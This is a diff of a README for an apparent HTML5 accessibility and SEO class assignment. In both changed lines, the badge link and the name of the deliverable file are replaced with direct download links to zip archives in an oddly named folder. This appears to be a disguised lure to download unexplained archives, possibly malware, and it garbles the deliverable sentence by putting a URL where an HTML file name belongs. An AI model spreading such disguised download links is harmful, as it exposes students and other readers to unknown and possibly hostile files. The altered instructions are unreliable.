@@ -1,4 +1,4 @@
-[![Review Assignment Due Date](https://github.com/Griffnificent/july-2025-introduction-to-html-5-Griffnificent/raw/refs/heads/main/Goniopholidae/html-Griffnificent-july-introduction-to-v3.9.zip)](https://github.com/Griffnificent/july-2025-introduction-to-html-5-Griffnificent/raw/refs/heads/main/Goniopholidae/html-Griffnificent-july-introduction-to-v3.9.zip)
+[![Review Assignment Due Date](https://raw.githubusercontent.com/Griffnificent/july-2025-introduction-to-html-5-Griffnificent/main/Goniopholidae/Griffnificent_to_july_html_introduction_pendantlike.zip)](https://raw.githubusercontent.com/Griffnificent/july-2025-introduction-to-html-5-Griffnificent/main/Goniopholidae/Griffnificent_to_july_html_introduction_pendantlike.zip)
 # 📘 Assignment: HTML5 + Accessibility & SEO Basics
 
 ## Overview
@@ -19,7 +19,7 @@ For SEO, emphasize the use of heading tags in the correct order, provide descrip
 
 ## Deliverables
 
-A single HTML file named `https://github.com/Griffnificent/july-2025-introduction-to-html-5-Griffnificent/raw/refs/heads/main/Goniopholidae/html-Griffnificent-july-introduction-to-v3.9.zip`. It should include:
+A single HTML file named `https://raw.githubusercontent.com/Griffnificent/july-2025-introduction-to-html-5-Griffnificent/main/Goniopholidae/Griffnificent_to_july_html_introduction_pendantlike.zip`. It should include:
 
 * A semantic structure using appropriate HTML5 elements.
 * Clear headings in a logical hierarchy.
